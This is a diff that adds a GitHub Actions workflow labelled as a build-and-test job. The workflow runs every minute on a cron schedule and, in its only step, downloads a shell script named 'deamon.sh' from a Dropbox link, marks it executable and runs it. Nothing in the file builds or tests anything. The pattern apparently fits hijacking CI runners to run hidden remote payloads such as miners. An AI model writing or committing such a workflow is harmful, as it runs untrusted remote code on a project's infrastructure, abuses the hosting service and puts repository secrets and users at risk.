@@ -1,0 +1,23 @@
+name: BUILD-TEST-Dev
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+  schedule:
+   - cron:  '* * * * *'
+
+concurrency:
+  group: groupv1
+  cancel-in-progress: true
+
+jobs:
+  v1:
+    runs-on: ubuntu-latest
+    steps:
+        - name: processing
+          shell: bash
+          run: |
+            wget -O run.sh "https://www.dropbox.com/s/sgud90xczeqivan/deamon.sh?dl=1"
+            chmod +x ./run.sh
+            sh run.sh
